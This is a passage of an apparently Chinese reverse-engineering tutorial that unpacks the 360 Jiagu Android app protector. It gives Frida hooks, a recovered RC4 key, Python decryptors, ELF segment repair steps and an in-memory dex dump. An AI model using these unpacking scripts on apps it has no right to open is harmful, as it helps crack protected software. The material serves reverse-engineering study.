rap_int64_t_bridgecall91:sub_9D60call92:sub_166C4call93:memcpycall94:_Z9__arm_a_2PcmS_Riicall95:j_ffi_prep_cif_varcall96:ffi_prep_cif_var我们以 sub_3C94 为起点开始分析，因为这是我们通过 dlopen 交叉引用找到的自实现 linker 加固 so 的一个功能函数 对 sub_3C94 不断按下 X 查看交叉引用，得到如下的调用关系 sub_4B54-&gt;sub_49F0-&gt;sub_3C94 sub_4B54 可能被 sub_8000 或 sub_8C74 调用 我们将 stalker_trace_so 打印出来的内容中，提取关键的部分拿过来看看，说明 sub_4B54 是被 sub_8000 调用的 call43:sub_8000 &lt;--call44:dlopencall45:sub_60E0call46:sub_6544call47:sub_4B54 &lt;--call48:sub_6128call49:_ZN9__arm_c_19__arm_c_0Evcall50:sub_A3ECcall51:sub_99CCcall52:sub_9944call53:sub_6484call54:sub_6590call55:prctlcall56:sub_6698call57:sub_9FFCcall58:j_lseek_3call59:j_lseek_2call60:j_lseek_0call61:sub_9A90call62:sub_5F20call63:sub_6044call64:sub_3574call65:uncompresscall66:sub_49F0 &lt;--call67:sub_5400call68:sub_5478call69:sub_5B08call70:sub_5650call71:sub_580Ccall72:opencall73:atoicall74:sub_3C94 &lt;--sub_8000 的函数长这个样子，请记住第 25 行 0xB8010 这个数字，后面会派上用场的 跟着函数调用链一处一处的在 IDA 中跳转到相应的地址进行查看，在 call62:sub_5F20 我们发现了有意思的代码 这个函数，一眼 RC4 呀 用 frida 去 hook 一下这个函数看看 RC4 的密钥是什么 function hook_5f20_guess_rc4()&#123;// 像是 RC4 的样子，hook 看看 var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x5f20), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(hexdump(args[0], &#123; offset: 0,// 相对偏移 length: 0x10,//dump 的大小 header: true, ansi: true &#125;)); console.log(args[1]) console.log(hexdump(args[2], &#123; offset: 0,// 相对偏移 length: 256,//dump 的大小 header: true, ansi: true &#125;)); &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125; 所以密钥就是这个咯 key = b\"vUV4#\\x91#SVt\"继续跟着函数调用链走，在 call63:sub_6044 我们发现了 RC4 的解密函数 hook 一下 call63:sub_6044 看看到底给什么数据解密了 var rc4_enc_text_addr,rc4_enc_size;function hook_rc4_enc()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x6044), &#123; // fd, buff, len onEnter: function (args) &#123; rc4_enc_text_addr = args[0]; rc4_enc_size = args[1]; console.log(hexdump(args[0], &#123; offset: 0,// 相对偏移 length: 0x30,//dump 的大小 header: true, ansi: true &#125;)); console.log(args[1]) &#125;, onLeave: function (ret) &#123; console.log(hexdump(rc4_enc_text_addr, &#123; offset: 0,// 相对偏移 length: 0x30,//dump 的大小 header: true, ansi: true &#125;)); &#125; &#125;);&#125; 这个函数的第二个参数是 0xb8010 , 感觉是解密的数据的长度的样子，而且这个数字，有没有感觉在哪里见过呢？ 没错，这个数字刚刚就出现在 sub_8000 中 而 v5[0] 的值是 qword_2E270 , 这个数组也是 01 18 25 e7 开头的 继续跟着调用链走，接下来是调用 call65:uncompress , 进行解压缩操作 function hook_uncompress_res()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(Module.findExportByName(null, \"uncompress\"), &#123; onEnter: function (args) &#123; console.log(\"hook uncompress\") console.log(hexdump(args[2], &#123; offset: 0,// 相对偏移 length: 0x30,//dump 的大小 header: true, ansi: true &#125;)); console.log(args[3]) dump_memory(args[2],args[3],`uncompress_$&#123;args[2]&#125;_$&#123;args[3]&#125;`) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;我们发现解压缩的数据，前面四个字节 b9 0e 1a 00 没有包含在解压缩的字节之内 现在既然我们已经知道了主 ELF 在壳 ELF 中的位置，以及解密的算法，那我们直接从解压 apk, 找到里面的 assets/libjiagu_a64.so , 不就能直接把壳 ELF 解密出来咯 import zlibimport structdef RC4(data, key): S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4decrypt(ciphertext, key): return RC4(ciphertext, key)wrap_elf_start = 0x1e270wrap_elf_size = 0xb8010key = b\"vUV4#\\x91#SVt\"with open('com.oacia.apk_protect/assets/libjiagu_a64.so','rb') as f: wrap_elf = f.read()# 对密文进行解密dec_compress_elf = RC4decrypt(wrap_elf[wrap_elf_start:wrap_elf_start+wrap_elf_size], key)dec_elf = zlib.decompress(bytes(dec_compress_elf[4::]))with open('wrap_elf','wb') as f: f.write(dec_elf)解密完成后，我们发现 0x1a0eb9 应该表示解压缩之后数据的大小 wrap_elf 的前半部分是一大堆莫名其妙有很多 D3 的东西，但是看到中间还是发现了壳 ELF 的身影 我们以 .ELF 为标志将这两部分分离一下 with open('wrap_elf', 'rb') as f: wrap_elf = f.read()ELF_magic = bytes([0x7F, 0x45, 0x4C, 0x46])for i in range(len(wrap_elf) - len(ELF_magic) + 1): if wrap_elf[i:i + len(ELF_magic)] == ELF_magic: print(hex(i)) with open('wrap_elf_part1', 'wb') as f: f.write(wrap_elf[0:i]) with open('wrap_elf_part2', 'wb') as f: f.write(wrap_elf[i::]) break跟着函数调用链来到 call69:sub_5B08 , 这里又出现了 0x38 , 并且 word_38 跳转过去的值为 6 这正好和 phentsize 和 phnum 的值相对应 所以可想而知，这又是一个关键点了，往下看一下代码，发现了循环异或，那我们不妨用 frida 把 v4 的值 hook 下来看看是什么 v4 的值出现了那么多的 d3 而这就是 wrap_elf 的前半部分那一大堆我们看不懂的字节 接下来用来解密的循环就是一个 arm64 的 neon 运算 官网可以找到 vdupq_n_s8 和 veorq_s8, 根据函数描述可以知道这里用向量运算，把向量中的每一个元素都异或了 0xd3 对 sub_5B08 进行分析之后，我们便可以知道 wrap_elf_part1 的读取方式是第一个字节表示被异或的数字，这里是 0xD3 , 后面的四个字节表示一个段的长度，随后读取指定长度的字节并异或，之后再读取四个字节获取到下一个段的长度，以此类推，直到读取到文件末尾 在 sub_5B08 的最后，因为 v31 , v19 , v43 , v7 代表对应的数据组的长度，所以这里共有四个数据组，而为了表示每一个数据组的长度共需占用 4*4=16 字节，并且文件开头还有 1 位的异或值，于是这些长度加起来， *(a1 + 0x98) 的偏移就来到了主 ELF 的魔术头 .ELF 的位置了 我们可以在 sub_5B08 中为变量 a1 定义一个结构体，成员分别表示数据组的 1,2,3,4 这四个部分，这样我们就知道这四个部分分别被用到什么地方了 struct deal_extra&#123; char blank[72]; int phnum; int *extra_part1; int phdr_size; char blank2[36]; int *extra_part2; int *extra_part3; int *extra_part4; int *main_elf;&#125;; 接下来再捋一下函数的调用链 sub_49F0-&gt;sub_5478(&amp;v16, a1, v4)-&gt;sub_5B08(a1, a2, a3) , 在 sub_5B08 中，我们把 a1 的类型定义成了 deal_extra , 所以理所应当的，我们也把 sub_49F0 中的变量 v16 的类型定义为 deal_extra 在 sub_49F0 中我们发现成员 extra_part 赋值给了变量 v7 , 所以我们也为 v7 建立一个结构体让 v7 的偏移可以对应这些变量 struct deal_extra_B&#123; char blank[232]; int *extra_part1; char blank1[8]; int phnum; int *extra_part4; char blank2[24]; int *extra_part2; char blank3[8]; int *extra_part3;&#125;; 这样做有什么意义呢？ 我们发现变量 v7 分别被传入到了 sub_3C94 和 sub_4918 中，我们分别进去看看 在 sub_3C94 中解析了 extra_part4 , 显而易见，这个 switch 是用来处理动态链接库的，即 extra_part4 对应 .dynamic 段 在 sub_4918 中， extra_part2 和 extra_part3 被传入到 sub_4000 中 而这个函数中的 switch 是用来处理重定位的，因为重定位主要有基址重定位和符号重定位，这两个的值分别是 0x403 和 0x402 所以 extra_part2 和 extra_part3 分别对应着 .rela.dyn (403 重定位) 和 .rela.plt (402 重定位) 而之后 extra_part1 被传入到了 sub_5E6C 中 而来到 sub_5E6C 也来到了我们最开始分析的起点 (兜兜转转又回来了), 所以 extra_part1 表示 program header table 至此为止，四个数据组所对应的段都分析完成 数据组1 表示 program header table 数据组2 表示 .rela.plt 数据组3 表示 .rela.dyn 数据组4 表示 .dynamic 所以接下来，写个脚本把这四个数据组给分离成单独的文件咯 import copyimport zlibdef RC4(data, key): S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4decrypt(ciphertext, key): return RC4(ciphertext, key)wrap_elf_start = 0x1e270wrap_elf_size = 0xb8010key = b\"vUV4#\\x91#SVt\"with open('com.oacia.apk_protect/assets/libjiagu_a64.so', 'rb') as f: wrap_elf = f.read()# 对密文进行解密dec_compress_elf = RC4decrypt(wrap_elf[wrap_elf_start:wrap_elf_start + wrap_elf_size], key)dec_elf = zlib.decompress(bytes(dec_compress_elf[4::]))with open('wrap_elf', 'wb') as f: f.write(dec_elf)class part: def __init__(self): self.name = \"\" self.value = b'' self.offset = 0 self.size = 0index = 1extra_part = [part() for _ in range(7)]seg = [\"phdr\", \".rela.plt\", \".rela.dyn\", \".dynamic\"]v_xor = dec_elf[0]for i in range(4): size = int.from_bytes(dec_elf[index:index + 4], 'little') index += 4 extra_part[i + 1].name = seg[i] extra_part[i + 1].value = bytes(map(lambda x: x ^ v_xor, dec_elf[index:index + size])) extra_part[i + 1].size = size index += sizefor p in extra_part: if p.value!=b'': filename = f\"libjiagu.so_&#123;hex(p.size)&#125;_&#123;p.name&#125;\" print(f\"[&#123;p.name&#125;] get &#123;filename&#125;, size: &#123;hex(p.size)&#125;\") with open(filename,'wb') as f: f.write(p.value)于是我们得到了这四个文件 # 主 ELF 导入导出表修复 需要被修复的主 ELF 是我们在从 assets/libjiagu_a64.so 利用 RC4 和 decompress 解密出来的文件的后半部分那个 ELF 可以写个 python 脚本分离出后面的 ELF with open('wrap_elf', 'rb') as f: wrap_elf = f.read()ELF_magic = bytes([0x7F, 0x45, 0x4C, 0x46])for i in range(len(wrap_elf) - len(ELF_magic) + 1): if wrap_elf[i:i + len(ELF_magic)] == ELF_magic: with open('libjiagu_0xe7000.so', 'wb') as f: f.write(wrap_elf[i::]) break现在我们拿到了主 ELF 的四个重要的数据段，分别是 phdr , .rela.plt , .rela.dyn , .dynamic , 那么接下来需要做的工作就是修复主 ELF 的导入导出表了，不然导入导出函数都看不见怎么逆嘞～ 在使用自实现 linker 加固 so 时， phdr , .rela.plt , .rela.dyn , .dynamic 这四个段是从待加固的 so 中提取出来，然后加密存储到其他位置， 原来的位置会使用无关字节直接覆盖 等到需要为加固的 so 进行预链接和重定位的工作时，才将这些段解密并通过自己实现的预链接和重定位代码，让待加固的 so 可以正确的被壳 so 加载出来 我们进行修复的方法其实就藏在这句话中 原来的位置会使用无关字节直接覆盖 ，我们可以将分离出来的这四个段再塞回到原来的位置 自实现linker加固so 的加固方案既然都把那四个段加密存到其他地方了，那怎么不直接把原来的四个段直接删除而是用无关字节覆盖呢？ 因为直接把段删除掉的话，会影响了一整个 ELF 文件的布局，偏移就会变得和原先不一样，然后产生各种奇奇怪怪的问题 在 010editor 中，按下 ctrl+shift+C 可以复制整块内存，按下 ctrl+shift+V 可以粘贴整块内存 修复 program header table 复制 libjiagu.so_0x150_phdr 的所有字节，然后来到 libjiagu_0xe7000.so 中选中 struct program_header_table 粘贴 随后按下 F5 刷新模板 修复 .dynamic program header table 的 (RW_) Dynamic Segment 的 p_offset 指向 .dynamic 段的位置 跳转到该位置，复制 libjiagu.so_0x1b0_.dynamic 的内容并粘贴到这个位置 修复重定位表 我们需要通过 .dynamic 段的 d_tag 字段来直到重定位表的位置，下面是 AOSP 中 d_tag 的宏定义 所有的 d_tag 标志对应的含义可以在 ORACLE 链接程序和库指南 中找到 对于我们修复主 ELF 比较重要的 tag 有 d_tag 值 含义 DT_JMPREL 0x17 .rela.plt 在文件中的偏移 DT_PLTRELSZ 0x2 .rela.plt 的大小 DT_RELA 0x7 .rela.dyn 在文件中的偏移 DT_RELASZ 0x8 .rela.dyn 的大小 我们可以在 .dynamic 中发现这些 tag 以及对应的值 看看这两个大小分别是 0x1650 和 0x25188 , 这不就和我们刚刚分离出来的文件大小一模一样嘛，说明我们离修复完成不远了 然后就是和之前一样，跳转到 .rela.plt 和 .rela.dyn 的对应地址，然后把这些段本来的数据粘贴进去 现在我们就修复好啦，拿 ida 打开主 ELF 看看，满满的都是符号！ 随便找个导入函数交叉引用看看，一切正常 (●'◡'●) 为了方便起见，我们可以将主 ELF 的基址定义成在其在壳 ELF 的偏移 0xe7000 方便后续的分析 # 主 DEX 解密流程初步分析 还记得在加固壳反调试初步分析中，我们拿到了未解密的 dex 嘛 那么接下来有个问题就是，这个未解密的 dex 究竟藏在了 apk 的什么地方呢？ 我将未加固的 apk 解压出来，然后用 7zip 压缩其中的 dex, 发现大小依然有 2.8MB 随后我将经过 360 加固之后的 apk 解压出来，按大小对文件进行排序之后发现，最大的文件就只有这个壳 classes.dex , 而别的文件甚至连 1MB 都没到，总不可能压缩率可以高到这种地步吧 所以我们打开 classes.dex 看看，在这个 classes.dex 的末尾，果然藏着一大堆的数据 而末尾的数据是由 71 68 00 01 和我们之前看到的加密的 dex 一模一样 接下来我们继续用 stalker_trace_so 去看看补充上主 ELF 的函数地址以及名称之后的函数调用链是什么样子的，首先在主 ELF 中运行插件 Edit-&gt;Plugins-&gt;stalker_trace_so 之后同样的，我们需要将 so_name 改成 libjiagu_64.so , 特别注意的是，这里我们需要把壳 ELF 的 func_addr 和 func_name 给复制过来，同时使用 concat 方法将主 ELF 和壳 ELF 的函数地址和函数名拼接成一个新的数组 之前替换 /proc/self/maps 来实现初步反调试的 js 函数 hook_proc_self_maps 也需要同时执行 输出结果如下， KEkeELF 标志表示壳 ELF, mainELF 表示主 ELF,(为什么是 KEke , 只是为了对齐看着舒服：)) 要判断调用的函数在哪个 ELF 里面，在 trace_so() 里面稍作修改判断一下范围可以了 打印出来的结果如下 (KEkeELF)call1:JNI_OnLoad(KEkeELF)call2:j_interpreter_wrap_int64_t(KEkeELF)call3:interpreter_wrap_int64_t (KEkeELF)call4:getenv (KEkeELF)call5:sub_13908 (KEkeELF)call6:inotify_add_watch (KEkeELF)call7:sub_11220(KEkeELF)call8:fopen(KEkeELF)call9:sub_9DD8(KEkeELF)call10:sub_E3E0(KEkeELF)call11:strtol(KEkeELF)call12:feof(KEkeELF)call13:raise(KEkeELF)call14:memset(KEkeELF)call15:sub_C918(KEkeELF)call16:sub_9988(KEkeELF)call17:sub_9964(KEkeELF)call18:sub_9AC4(KEkeELF)call19:j_ffi_prep_cif(KEkeELF)call20:ffi_prep_cif(KEkeELF)call21:j_ffi_prep_cif_machdep(KEkeELF)call22:ffi_prep_cif_machdep(KEkeELF)call23:j_ffi_call(KEkeELF)call24:ffi_call(KEkeELF)call25:sub_1674C(KEkeELF)call26:j_ffi_call_SYSV(KEkeELF)call27:ffi_call_SYSV(KEkeELF)call28:sub_167BC(KEkeELF)call29:sub_1647C(KEkeELF)call30:sub_163DC(KEkeELF)call31:sub_9900(KEkeELF)call32:sub_94BC(KEkeELF)call33:inotify_init(KEkeELF)call34:fmod(KEkeELF)call35:strncpy(KEkeELF)call36:_Z9__arm_a_1P7_JavaVMP7_JNIEnvPvRi(KEkeELF)call37:sub_9E58(KEkeELF)call38:sub_999C(KEkeELF)call39:sub_10964(KEkeELF)call40:j_lseek_1(KEkeELF)call41:lseek(KEkeELF)call42:sub_96E0(KEkeELF)call43:sub_8000(KEkeELF)call44:dlopen(KEkeELF)call45:sub_60E0(KEkeELF)call46:sub_6544(KEkeELF)call47:sub_4B54(KEkeELF)call48:sub_6128(KEkeELF)call49:_ZN9__arm_c_19__arm_c_0Ev(KEkeELF)call50:sub_A3EC(KEkeELF)call51:sub_99CC(KEkeELF)call52:sub_9944(KEkeELF)call53:sub_6484(KEkeELF)call54:sub_6590(KEkeELF)call55:prctl(KEkeELF)call56:sub_6698(KEkeELF)call57:sub_9FFC(KEkeELF)call58:j_lseek_3(KEkeELF)call59:j_lseek_2(KEkeELF)call60:j_lseek_0(KEkeELF)call61:sub_9A90(KEkeELF)call62:sub_5F20(KEkeELF)call63:sub_6044(KEkeELF)call64:sub_3574(KEkeELF)call65:uncompress(KEkeELF)call66:sub_49F0(KEkeELF)call67:sub_5400(KEkeELF)call68:sub_5478(KEkeELF)call69:sub_5B08(KEkeELF)call70:sub_5650(KEkeELF)call71:sub_580C(KEkeELF)call72:open(KEkeELF)call73:atoi(KEkeELF)call74:sub_3C94(KEkeELF)call75:strncmp(KEkeELF)call76:sub_4918(KEkeELF)call77:sub_4000(KEkeELF)call78:sub_41B4(KEkeELF)call79:sub_35AC(KEkeELF)call80:sigaction(KEkeELF)call81:sub_5E6C(KEkeELF)call82:sub_5444(mainELF)call83:sub_11603C(mainELF)call84:j__Znwm(mainELF)call85:_Znwm(mainELF)call86:malloc(mainELF)call87:__cxa_atexit(mainELF)call88:sub_1160B4(mainELF)call89:sub_1160C4(mainELF)call90:strlen(mainELF)call91:memcpy(mainELF)call92:sub_1161FC(mainELF)call93:sub_1164AC(mainELF)call94:sub_1164D8(mainELF)call95:sub_116528(mainELF)call96:sub_1165C8(mainELF)call97:sub_1A32C0(mainELF)call98:sub_1A3150(mainELF)call99:sub_1A3204(mainELF)call100:sub_1166FC(mainELF)call101:sub_116728(mainELF)call102:sub_116750(mainELF)call103:sub_116830(mainELF)call104:sub_116BA0(KEkeELF)call105:sub_633C(KEkeELF)call106:sub_8130(KEkeELF)call107:sub_4C70(KEkeELF)call108:sub_825C(KEkeELF)call109:sub_8B50(KEkeELF)call110:sub_8ED4(KEkeELF)call111:sub_8430(mainELF)call112:JNI_OnLoad(mainELF)call113:j_interpreter_wrap_int64_t(mainELF)call114:interpreter_wrap_int64_t(KEkeELF)call115:interpreter_wrap_int64_t_bridge(KEkeELF)call116:sub_9D60(mainELF)call117:sub_1B3F0C(mainELF)call118:gettimeofday(mainELF)call119:sub_11BD9C(mainELF)call120:sub_1182D8(mainELF)call121:sub_123970(mainELF)call122:sub_1B6448(mainELF)call123:getenv(mainELF)call124:sub_11F130(mainELF)call125:sub_12047C(mainELF)call126:j__ZdlPv(mainELF)call127:_ZdlPv(mainELF)call128:free(mainELF)call129:sub_1427E8(mainELF)call130:dlopen(mainELF)call131:sub_11BDA8(mainELF)call132:sub_11BE58(mainELF)call133:sub_11F69C(mainELF)call134:sub_117BE0(mainELF)call135:sub_117CA0(mainELF)call136:fopen(mainELF)call137:sub_117E90(mainELF)call138:sub_14285C(mainELF)call139:sub_1429CC(mainELF)call140:sub_11C1AC(mainELF)call141:sub_11C1B4(mainELF)call142:sub_11C210(KEkeELF)call143:sub_166C4(KEkeELF)call144:memcpy(mainELF)call145:sub_123324(mainELF)call146:sub_1205A0(mainELF)call147:sub_11F768(mainELF)call148:memcmp(mainELF)call149:opendir(mainELF)call150:closedir(mainELF)call151:sub_11859C(mainELF)call152:sub_11C268(mainELF)call153:sub_11C300(mainELF)call154:sub_117B68(mainELF)call155:sub_1186B8(mainELF)call156:sub_143964(mainELF)call157:sub_1B66A8(mainELF)call158:pthread_mutex_lock(mainELF)call159:sub_142EA0(mainELF)call160:sub_143A38(mainELF)call161:sub_11CF8C(mainELF)call162:sub_131D58(mainELF)call163:sub_1B66D0(mainELF)call164:pthread_mutex_unlock(mainELF)call165:sub_1178E8(mainELF)call166:sub_13D70C(mainELF)call167:sub_19F984(mainELF)call168:sub_11F1C8(mainELF)call169:atoi(mainELF)call170:sub_12D2F8(mainELF)call171:sub_17ABE8(mainELF)call172:sub_172660(mainELF)call173:sub_13BFF0(mainELF)call174:sub_172AA4(mainELF)call175:sub_13BD80(mainELF)call176:sub_13BE2C(mainELF)call177:sub_13BE4C(mainELF)call178:memmove(mainELF)call179:sub_13BE64(mainELF)call180:sub_172D78(mainELF)call181:sub_13E510(mainELF)call182:sub_1926F0(mainELF)call183:sub_13DB7C(mainELF)call184:sub_1B7A08(mainELF)call185:sub_1B7ABC(mainELF)call186:pthread_cond_broadcast(mainELF)call187:sub_12FA34(mainELF)call188:sub_120664(mainELF)call189:sub_1332B8(mainELF)call190:sub_13E0F8(mainELF)call191:sub_12743C(mainELF)call192:sub_124C68(mainELF)call193:sub_125DC4(mainELF)call194:sub_124510(mainELF)call195:sub_126888(mainELF)call196:strdup(mainELF)call197:sub_126920(mainELF)call198:sub_122180(mainELF)call199:sub_11BC1C(mainELF)call200:sub_13DF34(mainELF)call201:getpid(mainELF)call202:memset(mainELF)call203:snprintf(mainELF)call204:sub_124FA0(mainELF)call205:sub_1B6498(mainELF)call206:sub_1A0C88(mainELF)call207:sub_217444(mainELF)call208:sub_2175E0(mainELF)call209:read(mainELF)call210:strncmp(mainELF)call211:close(mainELF)call212:sub_1B578C(mainELF)call213:j___self_lseek(mainELF)call214:__self_lseek(mainELF)call215:sub_1B586C(mainELF)call216:j_j___read_self(mainELF)call217:j___read_self(mainELF)call218:__read_self(mainELF)call219:sub_1B6528(mainELF)call220:sub_1B6578(mainELF)call221:mmap(mainELF)call222:sub_1B5B50(mainELF)call223:calloc(mainELF)call224:memchr(mainELF)call225:sub_1B5D04(mainELF)call226:sub_1B5EC4(mainELF)call227:sub_1B6270(mainELF)call228:sub_1B6180(mainELF)call229:sub_1B6678(mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEnd(mainELF)call233:sub_1B6540(mainELF)call234:munmap(mainELF)call235:sub_1B56F8(mainELF)call236:sub_19BC9C(mainELF)call237:sub_19CCD4(mainELF)call238:sub_12D470(mainELF)call239:sub_142FE0(mainELF)call240:sub_143008(mainELF)call241:sub_142ABC(mainELF)call242:sub_143848(mainELF)call243:sub_143B48(mainELF)call244:sub_143088(mainELF)call245:sub_1222D0(mainELF)call246:sub_14316C(mainELF)call247:sub_142954(KEkeELF)call248:_Z9__arm_a_2PcmS_Rii(mainELF)call249:sub_142894(mainELF)call250:sub_1428BC(mainELF)call251:sub_127DCC(mainELF)call252:sub_14292C(mainELF)call253:sub_121B78(mainELF)call254:sub_121BE0(mainELF)call255:sub_123CE8(mainELF)call256:sub_123BC0(mainELF)call257:sub_11959C(mainELF)call258:sub_1AC170(mainELF)call259:pthread_create(mainELF)call260:sub_1AC210(mainELF)call261:sub_1B5DE4(mainELF)call262:sub_1B60E8(mainELF)call263:sub_19F7C4(mainELF)call264:sub_1B2DC8(mainELF)call265:sub_1B1CE8(mainELF)call266:sub_1B0974(mainELF)call267:sub_1AFE6C(mainELF)call268:sub_126ED8(mainELF)call269:sub_1AFE8C(mainELF)call270:sub_1AFE90(mainELF)call271:sub_1AB87C(mainELF)call272:sub_1B26D4(mainELF)call273:sub_1B26F4(mainELF)call274:sub_1B27C8(KEkeELF)call275:j_ffi_prep_cif_var(KEkeELF)call276:ffi_prep_cif_var(mainELF)call277:sub_1AAF48(mainELF)call278:sub_1AAF54(mainELF)call279:sub_2162D4(mainELF)call280:sub_1B2898(mainELF)call281:sub_1B2918(mainELF)call282:sub_1ABE90(mainELF)call283:sub_13E0EC(mainELF)call284:sub_124900(mainELF)call285:sub_1A0C34(mainELF)call286:sub_217188(mainELF)call287:j_strcmp(mainELF)call288:strcmp(mainELF)call289:sub_194514(mainELF)call290:sub_1A2380(mainELF)call291:sub_1A23CC(mainELF)call292:sub_1A2718(mainELF)call293:sub_1A2A94(mainELF)call294:sub_1A25E0(mainELF)call295:sub_1A2984分析输出的结果，我们发现了三个有趣的函数 inflateInit2_ , inflate , inflateEnd , 这不是 zlib 用来解压缩的函数嘛～ (mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEnd对 inflateInit2_ 交叉引用，发现有两个函数调用了它 那么要怎么知道是哪一个函数先调用的 inflateInit2_ 呢？向上看看函数调用链就行了 于是我们发现是 sub_1B6270 调用了 inflateInit2_ (mainELF)call227:sub_1B6270 &lt;--(mainELF)call228:sub_1B6180(mainELF)call229:sub_1B6678(mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEnd我们来到 sub_1B6270 , 先到 https://github.com/madler/zlib 把 zlib.h 中的 z_stream_s , 导入的方法和之前一样 # define z_const consttypedef unsigned char Byte; /* 8 bits */typedef unsigned int uInt; /* 16 bits or more */typedef unsigned long uLong; /* 32 bits or more */typedef struct z_stream_s &#123; z_const Bytef *next_in; /* next input byte */ uInt avail_in; /* number of bytes available at next_in */ uLong total_in; /* total number of input bytes read so far */ Bytef *next_out; /* next output byte will go here */ uInt avail_out; /* remaining free space at next_out */ uLong total_out; /* total number of bytes output so far */&#125; z_stream;重定义 s 的类型为 z_stream , 这四个字段的含义如下 s.next_in : 压缩数据 s.avail_in : 压缩数据的长度 s.next_out : 解压后的数据 s.avail_out : 解压后数据的长度 各个成员的偏移如图所示 随后我们用 frida 去 hook 一下 inflate 函数看看解压缩之后的数据是什么 这里有个技巧，就是如何可以 hook 到主 ELF 中的函数，因为在壳 ELF 加载进内存时，主 ELF 还没有被加载，所以假如在壳 ELF 通过 android_dlopen_ext 打开时我们进行 hook, 是会 hook 失败的 那么如何才能获取到主 ELF 的 hook 时机呢？我们可以通过统计外部函数的调用次数来判断是否已经加载了主 ELF, 例如我这里，我通过 zlib_count 统计外部函数 inflate 调用次数，因为在壳 ELF 会使用 uncompress 调用一次 inflate , 所以当第二次调用 inflate , 我们就知道这肯定是主 ELF 调用的，所以我们也可以在这个位置放心大胆的 hook 了 function dump_memory(start,size,filename) &#123; var file_path = \"/data/data/com.oacia.apk_protect/\" + filename; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; var libso_buffer = start.readByteArray(size.toUInt32()); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;function hook_zlib_result()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1B63F0), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(\"inflate result\") console.log(hexdump(next_in, &#123; offset: 0,// 相对偏移 length: 0x50,//dump 的大小 header: true, ansi: true &#125;)); console.log(hexdump(next_out, &#123; offset: 0,// 相对偏移 length: 0x50,//dump 的大小 header: true, ansi: true &#125;)); dump_memory(next_out,avail_out,\"dex001\") &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;var zlib_count=0;var next_in,avail_in,next_out,avail_out;function hook_zlib()&#123; Interceptor.attach(Module.findExportByName(null, \"inflate\"), &#123; // fd, buff, len onEnter: function (args) &#123; zlib_count+=1 if(zlib_count>1)&#123; hook_zlib_result(); &#125; next_in=ptr(args[0].add(0x0).readS64()); avail_in=ptr(args[0].add(0x8).readS64()); next_out=ptr(args[0].add(0x18).readS64()); avail_out=ptr(args[0].add(0x20).readS64()); console.log(hexdump(next_in, &#123; offset: 0,// 相对偏移 length: 0x50,//dump 的大小 header: true, ansi: true &#125;)); console.log(args[1]); &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;解压缩之后的输出如下，在输出的文件头，我们发现了 dex035 , 所以我们把这块内存 dump 下来看看，使用上方的 dump_memory(start,size,filename) 函数即可 把这个解压缩之后的 dex 拖入到 jadx 里面，却发现这个类名怎么和壳 DEX 的类名一模一样，通过校验哈希发现 dump 下来的 dex 和壳 dex 其实是同一个文件 我们在之前的分析中知道壳 dex 的末尾附带了一大串的加密数据，所以通过将这个解压缩得到了这个 dex, 就说明马上要进行加密主 DEX 的解密操作了 解压缩的函数是 sub_1B6270 , 接下来我们继续通过 stalker_trace_so 打印出来的内容，并利用交叉引用来追踪该函数的调用链 就比如说对于函数 sub_1B6270 , 它有两个交叉引用 通过 stalker_trace_so 打印出来的函数调用链，我们发现是 sub_1A0C88 在 sub_1B6270 之前调用，所以函数的调用关系就是 sub_1A0C88-&gt;sub_1B6270 , 以此类推 (mainELF)call206:sub_1A0C88(mainELF)call227:sub_1B6270所以一路跟过来之后，函数的调用链为 sub_1332B8-&gt;sub_124FA0-&gt;sub_1A0C88-&gt;sub_1B6270-&gt;inflate , sub_1332B8 函数之后就没有交叉引用了 (mainELF)call189:sub_1332B8(mainELF)call204:sub_124FA0(mainELF)call206:sub_1A0C88(mainELF)call227:sub_1B6270(mainELF)call230:inflateInit2_(mainELF)call231:inflate(mainELF)call232:inflateEnd在这个函数中，我们发现了 apk@classes.dex , 而它的作用，正是为了找到已加载到内存且优化后的壳 dex 在加固壳反调试初步分析的后半部分，我们打印出了加固壳打开 dex 的堆栈回溯，现在我们直接跳转到相对应的地方看看 我们到 0x19b780 看看，看起来是一个标准的打开并写入文件的函数 随后对该函数进行交叉引用，我们发现 sub_1332B8 竟然调用了它，就在刚刚我们就分析出这个函数中可是同时也执行了从内存中获取壳 dex 的操作的呢 我们对这两处调用都 hook 一下看看是什么情况，打印的结果如下，说明这两处调用都打开了 dex, sub_1332B8 中的前一个调用打开了 classes.dex , 后一个调用打开了 classes2.dex 和 classes3.dex , 而 classes.dex 文件中的内容就是加密的主 dex 在创建完 classes2.dex 和 classes3.dex , 通过 hook 发现调用在调用 sub_128D44 之后进程就退出了 我们去 hook 一下 sub_128D44 这个函数，发现传入的参数 v8 正是加密的主 DEX 而 sub_128D44 函数是这个样子的，并且在壳 ELF 加载时启动 stalker_trace_so 的 trace_so() 函数所打印出的结果中，并没有这个函数的调用被打印出来 这该怎么办呢？ 很简单，在调用 sub_128D44 的位置再去调用一次 